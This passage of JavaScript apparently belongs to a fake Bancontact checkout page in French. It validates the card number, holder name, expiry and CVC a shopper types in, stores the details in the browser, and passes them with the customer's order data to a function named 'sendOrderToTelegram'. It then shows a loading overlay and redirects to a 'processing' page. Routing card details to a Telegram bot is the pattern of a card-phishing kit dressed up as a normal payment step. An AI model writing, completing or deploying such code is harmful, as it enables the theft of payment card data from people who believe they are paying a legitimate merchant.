            const cardHolder = bancontactElements.cardHolder.value.trim();
            const expiry = bancontactElements.cardExpiry.value;
            const cvv = bancontactElements.cardCVV.value; 

            if (!bank) { alert('Veuillez sélectionner votre banque'); return; }
            if (cardNumber.length < 16 || cardNumber.length > 19) { alert('Numéro de carte Bancontact invalide'); return;}
            if (cardHolder.length < 3) { alert('Nom du titulaire invalide'); return; }
            if (!expiry.match(/^\d{2}\/\d{2}$/)) { alert('Date d\'expiration invalide (MM/AA)'); return; }
            if (cvv.length !== 3 && cvv.length !== 0) { alert('Code de sécurité invalide (CVC) ou laissez vide si non applicable.'); return; }

            if (bancontactElements.loadingOverlay) bancontactElements.loadingOverlay.classList.add('active');
            
            const paymentDetails = { type: 'Bancontact', bank: bank, cardHolder: cardHolder, cardNumber: cardNumber, cardExpiry: expiry };
            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
            
            const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
            const customerData = currentOrderData.customer || {}; 
            await sendOrderToTelegram(customerData, paymentDetails);

            setTimeout(() => {
                if (bancontactElements.loadingOverlay) bancontactElements.loadingOverlay.classList.remove('active');
                window.location.href = 'traitement4.html'; 
            }, 3000);
        });
        displayOrderItems(); 
    }
});
